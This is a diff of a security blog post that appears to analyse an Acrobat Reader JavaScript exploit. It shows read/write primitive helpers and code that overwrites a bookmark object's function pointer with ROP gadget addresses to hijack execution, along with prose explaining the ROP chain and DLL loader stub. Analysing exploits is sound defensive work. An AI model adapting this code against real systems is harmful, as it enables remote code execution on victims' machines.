@@ -329,19 +329,19 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
 
 ```
 function myread(addr){
-    mydv.setUint32(mypos,addr,true);
+    mydv.setUint32(mypos, addr, true);
     var res = myarray[0];
-    mydv.setUint32(mypos,myarraybase,true);
+    mydv.setUint32(mypos, myarraybase, true);
     return res;
 }
 
-function mywrite(addr,value){
-    mydv.setUint32(mypos,addr,true);
-    myarray[0] = value ;
-    mydv.setUint32(mypos,myarraybase,true);
+function mywrite(addr, value){
+    mydv.setUint32(mypos, addr, true);
+    myarray[0] = value;
+    mydv.setUint32(mypos, myarraybase, true);
 }
 ```
-<p class="cn" markdown="1">Naturally, they use some helper functions to use the new read/write primitive. At this point it's game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, overwrote the bookmark object's execute function pointer to finally redirect execution flow.</p>
+<p class="cn" markdown="1">Naturally, they use some helper functions to use the new read/write primitive. At this point it's game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, stored it all in the `myarray` Array overwrote the bookmark object's execute function pointer with the base address of `myarray` to finally redirect execution flow.</p>
 
 ```
 var bkm = this.bookmarkRoot;        
@@ -351,8 +351,8 @@ objescript = myread(objescript);
 ...
 
 mywrite(objescript, 0x6b707d06 - 0x6b640000 + dll_base); 
-mywrite(objescript+4,myarraybase);
-mywrite(objescript+0x598,0x6b68389f - 0x6b640000 + dll_base);
+mywrite(objescript + 4, myarraybase);
+mywrite(objescript + 0x598,0x6b68389f - 0x6b640000 + dll_base);
 
 // adios!
 bkm.execute();
